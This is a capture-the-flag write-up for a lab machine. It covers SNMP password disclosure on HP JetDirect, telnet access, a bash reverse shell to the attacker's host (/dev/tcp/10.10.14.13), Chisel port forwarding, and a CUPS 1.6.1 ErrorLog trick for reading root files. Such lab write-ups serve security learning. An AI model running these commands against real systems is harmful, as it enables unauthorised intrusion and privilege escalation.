1. Run nmap to discover open ports and services from the web server.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/08984687-2d7a-4ff1-b1ee-226af837b7ec)

2. From the result, it shows telnet service so we try to telnet the ip address and been asked to input a password.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/b075b06f-4035-4af0-966f-fb0fc339a9fe)

3. Let's check from the udp port with nmap.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/153b0fae-1fde-4ded-978c-6c8193a62923)

4. We discover that a SNMP port 161 is opened. Next, we googling all the way to find any vulnerability related to snmp and HP JetDirect and found this [link](https://www.exploit-db.com/exploits/22319) where's about HP JetDirect password disclosure. We can execute `snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0`
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/294b4b5a-b539-4066-bf31-130ab5379ad7)

5. Seems like an ascii sequence. To decode we can use this [tool](https://www.dcode.fr/ascii-code) and the password is P@ssw0rd@123!!123
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/729d83bd-4d58-4385-a3d1-c5f0cec61d21)

6. Input the password and we try to input `ls` directly first and it isn't working so we try add exec in front of the input. The flag is found in user.txt.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/576ac93c-cdca-4997-93c7-9fde013b90d2)

7. Another vulnerability is we can do reverse shell with this payload `exec bash -c "bash -i >& /dev/tcp/10.10.14.13/777 0>&1"`. 
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/b6d5cf7d-265c-43e2-9cff-71499e5dd686)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/10d8ba08-cbaf-4679-965d-4a25f836fe03)

8. Checking one by one directory and not find any interesting thing. Let's check the network stats.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/9d83cc85-58f4-4980-a97a-bbb04d767ce2)

9. The second one is quite suspicious because it runs locally. We can't check directly because it runs on target machine, not our machine. Don't worry, we can use tool called [Chisel](https://github.com/jpillora/chisel) to give access so we can access the target machine localhost in our terminal. We can run `python3 -m http.server 80` in our machine and `wget <ip address>/<chiselfile>` for give the chisel file to target machine.<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/a7d28b59-94c1-45af-849a-37af8104c50a)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/00ff28b4-c6e5-4934-a876-b05c04e8c3de)

10. Now we do a small reverse shell with chisel. We can run this payload and here's the response. When we opened, it's a CUPS 1.6.1 web server.
Target Terminal:
`./chisel_1.9.1_linux_amd64 client 10.10.14.13:888 R:631:localhost:631`

Host Terminal:
`./chisel_1.9.1_linux_amd64 server -p 888 --reverse`

![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/1b9e5fbc-e6e7-4f90-b980-95b66c747c7f)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/8e506805-ad0b-44b6-b0b2-82b8cf8110e8)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/66f60f91-c733-4f34-a4af-b3ece3b74509)

11. Open administration page (admin) and we get these features.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/7b412740-09c7-4582-b117-38e89ebf126a)

12. Googling to find any vulnerability related to CUPS 1.6.1 and found this [article](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/). It describes that the cupsd daemon change any input inside the error log as a plaintext.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/2c40abab-8c1b-4445-b3a6-6c0e754c5d6d)

13. Because it's related to error log, next we open the `view error log` feature in administration page and it looks like this.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/cf650ce3-e3e5-4e47-ba75-6b6862e7d7da)

14. Now we are searching the payload that are related to CUPS 1.6.1 and error log. Then we find this [payload](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/c4f8bd5f-91e6-41e3-b722-1a23b2ead94d)

15. Now we just need to run `cupsctl ErrorLog="/root/root.txt"`. This means that the cupsctl give the input to ErrorLog so the cupsd daemon can translate it into plaintext as a bash command. To see the response, we can run `curl 127.0.0.1:631/admin/log/error_log?` and get the root flag!<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/7c436128-d182-445c-b46a-d160c8c05e2b)




